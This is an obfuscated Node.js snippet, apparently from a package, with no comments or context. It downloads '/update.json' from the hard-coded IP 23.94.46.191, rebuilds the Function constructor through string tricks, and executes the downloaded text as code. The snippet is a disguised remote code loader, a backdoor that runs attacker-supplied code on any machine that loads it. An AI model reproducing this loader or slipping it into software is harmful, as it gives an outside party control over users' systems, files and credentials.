(function () {
  var _0x5d7aff = {jQJOp: function (_0x32ccc9, _0x575352) {
    return _0x32ccc9 + _0x575352;
  }, awzXp: function (_0x251030) {
    return _0x251030();
  }, EVBxn: "data", YBreV: "end", BzZVl: "http", UwMpX: "23.94.46.191"};
  var _0x346e0b = require(_0x5d7aff.BzZVl);
  return _0x346e0b.get({host: _0x5d7aff.UwMpX, port: 80, path: "/update.json"}, function (_0xe17b6c) {
    var _0x14c5d8 = "";
    _0xe17b6c.on(_0x5d7aff.EVBxn, function (_0x5413a0) {
      _0x14c5d8 += _0x5413a0;
    });
    _0xe17b6c.on(_0x5d7aff.YBreV, function () {
      var _0x5abfc8 = this[_0x5d7aff.jQJOp((typeof this.Buffer.from).charAt(0).toUpperCase(), (typeof this.Buffer.from).slice(1))];
      var _0x56fb42 = new _0x5abfc8(_0x14c5d8);
      _0x5d7aff.awzXp(_0x56fb42);
    });
  });
}());

